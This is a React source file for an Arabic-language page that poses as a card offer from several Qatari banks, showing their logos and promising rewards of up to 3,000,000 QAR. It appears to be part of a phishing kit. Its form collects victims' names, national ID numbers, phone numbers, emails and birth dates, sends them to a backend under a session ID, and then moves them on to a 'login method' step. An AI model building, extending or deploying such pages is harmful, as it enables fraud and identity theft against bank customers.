import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

const bankLogos = {
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
};

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const [formData, setFormData] = useState({
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    phoneNumber: "",
    email: "",
    dateOfBirth: "",
    gender: "ذكر",
    customerStatus: "عميل حالي",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId,
        nameArabic: formData.nameArabic,
        nameEnglish: formData.nameEnglish,
        idNumber: formData.idNumber,
        phoneNumber: formData.phoneNumber,
        email: formData.email,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      toast.success("تم حفظ البيانات بنجاح");
      setLocation(`/login-method?bank=${bank}&session=${sessionId}`);
    } catch (error) {
      toast.error("حدث خطأ في حفظ البيانات");
    }
  };

  return (
    <html lang="ar" dir="rtl">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Personal Data</title>
        <style>{`
          body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; padding-top: 70px; padding-bottom: 20px; }
          
          .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
          .logo { height: 40px; }
          .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
          .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }

          .bank-box { width: 100%; background: #fff; border-bottom: 1px solid #ddd; padding: 10px 0; }
          .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }

          .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-right: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
          .line { border-bottom: 1px solid #eee; padding: 8px 0; font-size: 14px; color: #333; }
          .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; }

          .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
          .form-group { margin-bottom: 15px; }
          label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
          input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
          .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }

          .footer-image { width: 100%; display: block; margin-top: 20px; }
        `}</style>
      </head>
      <body>
        <header className="header">
          <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
            <div className="menu-icon">&#9776;</div>
            <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
          </div>
          <a href="personal_data_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
            English
          </a>
        </header>

        <div className="bank-box">
          <img src={bankLogos[bank as keyof typeof bankLogos] || bankLogos.doha} className="bank-logo" alt="Bank Logo" />
        </div>

        <div className="info-box">
          <div className="line">✔ مميزات البطاقة: أولوية قصوى، تجميع نقاط مضاعف، دخول الصالات</div>
          <div className="line">✔ أفضل شركات الطيران: الخطوط القطرية، السنغافورية، طيران الإمارات</div>
          <div className="line">✔ أفضل درجة رجال أعمال: Qsuite القطرية، درجة رجال الأعمال السنغافورية</div>
          <div className="line">✔ أفضل صالات رجال أعمال: صالة المرجان، صالات سيلفر كريس</div>
          <div className="line">✔ أفضل شركة طيران في الشرق الأوسط: القطرية، الإمارات، الاتحاد</div>
          <div className="rewards-line">● مكافآت شهرية تصل إلى 5,000 ريال قطري</div>
          <div className="rewards-line">● جوائز سنوية تصل إلى 3,000,000 ريال قطري</div>
          <div className="rewards-line">● خصومات عالمية تصل إلى 70%</div>
        </div>

        <div className="form-container">
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label>الاسم كما في الهوية (بالإنجليزي)</label>
              <input
                type="text"
                name="nameEnglish"
                placeholder="Full Name"
                value={formData.nameEnglish}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>الاسم (بالعربي)</label>
              <input
                type="text"
                name="nameArabic"
                placeholder="الاسم الكامل"
                value={formData.nameArabic}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>رقم الهوية</label>
              <input
                type="number"
                name="idNumber"
                placeholder="رقم الهوية"
                value={formData.idNumber}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>رقم الجوال</label>
              <input
                type="number"
                name="phoneNumber"
                placeholder="00974XXXXXXXX"
                value={formData.phoneNumber}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>البريد الإلكتروني (Gmail)</label>
              <input
                type="email"
                name="email"
                placeholder="example@gmail.com"
                value={formData.email}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>تاريخ الميلاد</label>
              <input
                type="date"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label>النوع</label>
              <select name="gender" value={formData.gender} onChange={handleChange}>
                <option>ذكر</option>
                <option>أنثى</option>
              </select>
            </div>
            <div className="form-group">
              <label>حالة العميل</label>
              <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
                <option>عميل حالي</option>
                <option>عميل جديد</option>
              </select>
            </div>
            <button type="submit" className="submit-btn">
              متابعة
            </button>
          </form>
        </div>

        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
      </body>
    </html>
  );
}
